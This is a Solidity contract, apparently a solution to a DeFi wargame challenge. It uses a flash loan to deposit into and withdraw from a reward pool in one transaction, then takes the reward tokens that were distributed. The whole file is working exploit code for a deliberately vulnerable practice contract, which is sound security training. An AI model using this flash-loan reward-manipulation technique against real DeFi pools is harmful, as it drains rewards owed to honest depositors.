// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

contract HackRewardPool {
    TheRewarderPool public immutable pool;
    address token;
    address reward;
    constructor(TheRewarderPool _pool, address _token, address _reward) {
        pool = _pool;
        token = _token;
        reward = _reward;
    }

    function receiveFlashLoan(uint256 amount) public {
        IERC20(token).approve(address(pool),amount);
        pool.deposit(amount);
        pool.withdraw(amount);
        IERC20(token).transfer(msg.sender,amount);
    }
    function callFlashloan(FlashLoanerPool flashpool, uint256 amount) public {
        flashpool.flashLoan(amount);
        IERC20(reward).transfer(msg.sender,IERC20(reward).balanceOf(address(this)));
    }
}